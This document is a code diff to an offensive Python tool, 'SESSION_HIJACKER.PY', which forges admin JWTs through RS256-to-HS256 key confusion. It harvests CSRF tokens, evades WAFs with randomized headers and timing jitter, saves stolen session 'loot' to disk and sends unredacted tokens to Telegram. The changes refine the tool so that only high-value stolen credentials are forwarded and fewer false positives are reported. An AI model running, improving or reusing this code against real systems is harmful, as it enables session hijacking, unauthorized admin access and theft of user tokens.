@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 """
-SESSION_HIJACKER.PY v8.6 — Advanced Session Seeding, JWT Key Confusion & Token Replay (Elite Red Team Adversarial Edition)
+SESSION_HIJACKER.PY v8.8 — Advanced Session Seeding, JWT Key Confusion & Token Replay (Elite Red Team Adversarial Edition)
 Features:
 - Dynamic target resolution & multi-framework CSRF/token harvesting (Laravel, Rails, Express, Django)
 - Automated JWT algorithm downgrade & HMAC public-key confusion fuzzing (RS256 -> HS256)
 - Poisson behavioral timing jitter & WAF-evading browser header/client hint rotation
 - Robust cookie-jar state synchronization, SHA-256 integrity hashing, and tamper-evident disk loot (loot_output/)
-- Real-time asynchronous Telegram notification dispatch for unredacted session loot & forged tokens
+- Real-time asynchronous Telegram notification dispatch for unredacted session loot & forged tokens (Zero Noise Filter)
 """
 import sys
 import json
@@ -28,15 +28,27 @@ from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hin
 # Suppress insecure HTTPS warnings if self-signed certs are used in pre-production
 httpx._config.DEFAULT_CIPHERS += ":HIGH:!MEDIUM:!LOW:!NULL"
 
+# Keywords required to pass the zero-noise filter
+HIGH_VALUE_KEYWORDS = [
+    "critical", "bypass", "success", "loot", "token", "session", 
+    "admin", "credential", "compromised", "race", "pivot", "jwt", "dump", "hijack", "privilege"
+]
+
 async def broadcast_tg_alert_async(loot_type, details):
     try:
-        await send_telegram_alert(loot_type, details)
+        check_str = f"{loot_type} {str(details)}".lower()
+        if any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
+            await send_telegram_alert(f"[CRITICAL BREACH] {loot_type}", details)
     except Exception:
         pass
 
 def broadcast_tg_alert_sync(loot_type, details):
-    """Helper to non-blockingly fire Telegram alerts from synchronous functions."""
+    """Helper to non-blockingly fire Telegram alerts from synchronous functions with zero-noise filtering."""
     try:
+        check_str = f"{loot_type} {str(details)}".lower()
+        if not any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
+            return  # Suppress low-priority telemetry chatter completely
+
         import asyncio
         loop = asyncio.get_running_loop()
         if loop.is_running():
@@ -84,17 +96,23 @@ def fuzz_jwt_confusion(client, target_url, headers, cookies):
 
         sys.stdout.write(f"\033[93m[!] JWT token structure identified. Testing automated RS256 -> HS256 key confusion...\033[0m\n")
 
-        # Attempt to fetch JWKS public key
+        # Attempt to fetch JWKS public key from target
         jwks_key = None
-        for jwks_path in ["/.well-known/jwks.json", "/api/jwks.json"]:
+        for jwks_path in ["/.well-known/jwks.json", "/api/jwks.json", "/oauth/jwks.json"]:
             try:
                 apply_behavioral_jitter()
                 jwks_resp = client.get(f"{target_url}{jwks_path}", headers=get_randomized_hints())
                 if jwks_resp.status_code == 200:
-                    jwks_key = jwks_resp.text
-                    break
+                    data = jwks_resp.json()
+                    if "keys" in data or "n" in data or len(jwks_resp.text) > 20:
+                        jwks_key = jwks_resp.text
+                        break
             except Exception:
                 pass
+
+        # If no genuine public key is exposed by target, abort key confusion to eliminate false positives
+        if not jwks_key:
+            return vulnerable_findings
 
         # Construct forged admin payload
         header_hs = base64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}))
@@ -102,36 +120,43 @@ def fuzz_jwt_confusion(client, target_url, headers, cookies):
         payload = base64url_encode(json.dumps(payload_data))
         header_payload_str = f"{header_hs}.{payload}"
 
-        # Sign using JWKS public key or fallback secret
-        secret_to_use = jwks_key if jwks_key else "public_key_fallback"
-        signature = sign_hs256(header_payload_str, secret_to_use)
+        # Sign using harvested target JWKS public key
+        signature = sign_hs256(header_payload_str, jwks_key)
         forged_token = f"{header_payload_str}.{signature}"
 
         # Test forged token against protected endpoint
         apply_behavioral_jitter()
         test_resp = client.get(f"{target_url}/api/admin", headers={**headers, "Authorization": f"Bearer {forged_token}"})
         
-        if test_resp.status_code == 200 and "error" not in test_resp.text.lower():
+        body = test_resp.text
+        is_landing_shell = (
+            "<div id=\"root\"></div>" in body or 
+            "<div id=\"__next\"></div>" in body or 
+            "<div id=\"__nuxt\"></div>" in body or
+            ("<html" in body.lower() and "json" not in test_resp.headers.get("content-type", "").lower() and len(body) > 1000)
+        )
+
+        if test_resp.status_code == 200 and not is_landing_shell and "error" not in body.lower():
             sys.stdout.write(f"\033[91m[!!!] CRITICAL: JWT Key Confusion Vulnerability Confirmed! [HTTP 200]\033[0m\n")
-            loot_hash = hashlib.sha256(test_resp.text.encode("utf-8")).hexdigest()
+            loot_hash = hashlib.sha256(body.encode("utf-8")).hexdigest()
             
             confusion_payload = {
                 "vulnerable": True,
                 "vector": "JWT Key Confusion (RS256 -> HS256)",
                 "forged_token": forged_token,
                 "integrity_hash": loot_hash,
-                "response_sample": test_resp.text[:400]
+                "response_sample": body[:400]
             }
             vulnerable_findings.append(confusion_payload)
 
-            stream_proof("JWT_KEY_CONFUSION_SUCCESS", f"{target_url}/api/admin", {}, test_resp.text[:300], confusion_payload)
+            stream_proof("JWT_KEY_CONFUSION_SUCCESS", f"{target_url}/api/admin", {}, body[:300], confusion_payload)
             save_session_loot(
                 target=target_url,
                 endpoint="/api/admin",
                 finding_type="JWT_KEY_CONFUSION_SUCCESS",
                 status=test_resp.status_code,
                 headers=dict(test_resp.headers),
-                body=test_resp.text,
+                body=body,
                 extra_loot=confusion_payload
             )
             broadcast_tg_alert_sync("JWT Key Confusion Success", confusion_payload)
